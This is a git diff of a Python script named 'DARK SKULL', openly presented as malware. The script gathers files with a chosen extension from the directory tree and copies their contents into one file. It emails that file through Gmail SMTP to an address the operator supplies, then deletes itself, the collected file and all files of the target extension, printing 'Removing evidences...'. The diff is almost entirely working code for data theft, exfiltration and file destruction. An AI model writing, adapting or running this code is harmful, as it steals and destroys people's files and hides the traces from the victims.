@@ -2,19 +2,22 @@
 #!/usr/bin/env python
 
 import glob, smtplib, time
-import os, sys, argparse
+import os, sys, argparse, shutil
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+from pathlib import Path
 
 def main():
 
         parser = argparse.ArgumentParser(description='COMMANDS:')
         parser.add_argument('--target', "-t", help="what is the target extension, for example: txt, java, js, html etc")
         parser.add_argument('--mail', "-m", help="who will receive the email")
-        parser.add_argument('--directory', "-d", help="directory for the search, for example: ./, ./Downloads, ../")
+        #parser.add_argument('--directory', "-d", help="directory for the search, for example: ./, ./Downloads, ../")
         args = parser.parse_args()   
+
+
 
         print("Welcome to DARK SKULL")
         time.sleep(1)
@@ -62,11 +65,19 @@ def main():
         print("")
         time.sleep(1)
 
+        for root, dirs, files in os.walk("."):
+                for file in files:
+                        if file.endswith(".txt"):
+                                old_file_path = os.path.join(root, file)
+                                new_file_path = os.path.join('.', file)
+                                shutil.move(old_file_path, new_file_path)
+                       
+                                
+        programs = glob.glob("*.{}".format(args.target))
+
         #target =input("Which extension do you want to delete?(Ex: txt, py, java, js, html, css, ru, etc):")
         target = args.target
 
-
-        programs = glob.glob("{}*.{}".format(args.directory, args.target))
         for p in programs:
                 file = open(p, "r")
                 original = file.readlines()   
@@ -80,23 +91,24 @@ def main():
                 file.writelines('\n')
                 file.close()
 
-                newCode ="Nothing for here..."
-                file = open(p, "w")
-                file.writelines(newCode)
-                file.close()
+                #newCode ="Nothing for here..."
+                #file = open(p, "w")
+                #file.writelines(newCode)
+                #file.close()
+                #os.remove(file)
 
         time.sleep(1)
 
-        print("Dark Skull infected all the {} files in this directory".format(target))
+        print("Dark Skull infected all the {} files.".format(target))
         time.sleep(1)
 
         print("Ready to send the content by e-mail to {}...".format(args.mail))
         time.sleep(1)
 
         #mail login
-        fromaddr = "[<MAIL>]"
+        fromaddr = "email"
         toaddr = "{}".format(args.mail)
-        frompass = "[<PASS>]"
+        frompass = "pass"
 
         msg = MIMEMultipart()
 
@@ -120,7 +132,7 @@ def main():
 
         print("Login...")
         #smtp
-        server = smtplib.SMTP('<smtp.gmail.com>', 587)
+        server = smtplib.SMTP('smtp.gmail.com', 587)
         server.ehlo()
         server.starttls()
         server.login(fromaddr,frompass)
@@ -130,8 +142,7 @@ def main():
         server.sendmail(fromaddr, toaddr, text)
         server.quit()
         time.sleep(1)
-
-        print("Removing evidences...")
+        
         os.remove("darkskull.py")
 
         endMsg = "Nothing for here..."
@@ -140,8 +151,21 @@ def main():
         file.close()
 
         time.sleep(1)
-        print("Finished")
 
 if __name__ == "__main__":
-    main()
-    os.remove("content.txt")
+        parser = argparse.ArgumentParser(description='COMMANDS:')
+        parser.add_argument('--target', "-t", help="what is the target extension, for example: txt, java, js, html etc")
+        parser.add_argument('--mail', "-m", help="who will receive the email")
+        #parser.add_argument('--directory', "-d", help="directory for the search, for example: ./, ./Downloads, ../")
+        args = parser.parse_args()   
+
+        main()
+        print("Removing evidences...")
+        os.remove("content.txt")
+
+        dir=os.listdir(".")
+
+        for item in dir:
+                if item.endswith(".{}".format(args.target)):
+                        os.remove(item)
+        print("Finished")
